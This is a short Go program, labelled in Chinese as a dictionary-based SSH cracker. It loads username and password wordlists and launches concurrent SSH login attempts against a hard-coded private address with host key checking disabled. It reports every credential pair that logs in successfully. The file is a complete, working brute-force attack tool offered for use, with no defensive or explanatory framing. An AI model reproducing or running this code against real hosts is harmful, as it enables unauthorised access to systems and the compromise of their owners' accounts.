package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
	"time"
)
//@Document 利用字典破解SSH

type HostInfo struct {
	host   string
	port   string
	user   string
	pass   string
	isWeak bool
}

func main() {
	userDict := "c:/user.dict"
	passDict := "c:/pass.dict"

	sliceUser := make([]string, 2)
	userDictFile, _ := os.Open(userDict)
	defer userDictFile.Close()
	scannerU := bufio.NewScanner(userDictFile)
	scannerU.Split(bufio.ScanLines)

	for scannerU.Scan() {
		sliceUser = append(sliceUser, scannerU.Text())
	}

	slicePass := make([]string, 2)
	passDictFile, _ := os.Open(passDict)
	defer passDictFile.Close()
	scannerP := bufio.NewScanner(passDictFile)
	scannerP.Split(bufio.ScanLines)
	for scannerP.Scan() {
		slicePass = append(slicePass, scannerP.Text())
	}

	sscount := 0
	result := make(chan HostInfo)
	for _, user := range sliceUser {
		for _, passwd := range slicePass {
			HostInfo := HostInfo{}
			HostInfo.host = "192.168.0.100"
			HostInfo.port = "22"
			HostInfo.user = user
			HostInfo.pass = passwd
			HostInfo.isWeak = false

			if (len(user) > 2 && len(passwd) > 4) {
				go Crack(HostInfo,result)
				sscount++
			}
		}
	}
	for a := 0; a < sscount; a++{
		res := <- result
		if(res.isWeak){
			fmt.Printf("[SUCCES] Host:%s:%s (%s,%s)\n",res.host,res.port,res.user,res.pass)
		}
	}


}

func Crack(HostInfo HostInfo,result chan<- HostInfo)  {
	host := HostInfo.host
	port := HostInfo.port
	user := HostInfo.user
	passwd := HostInfo.pass

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd),
		},
		Timeout:         10 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	//fmt.Printf("[Check] Host:%s:%s (%s,%s)\n",host,port,user,passwd)
	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		result <- HostInfo
	} else {
		session, err := client.NewSession()
		defer session.Close()
		if err != nil {
			result <- HostInfo
		} else {
			HostInfo.isWeak = true
			result <- HostInfo
		}

	}

}
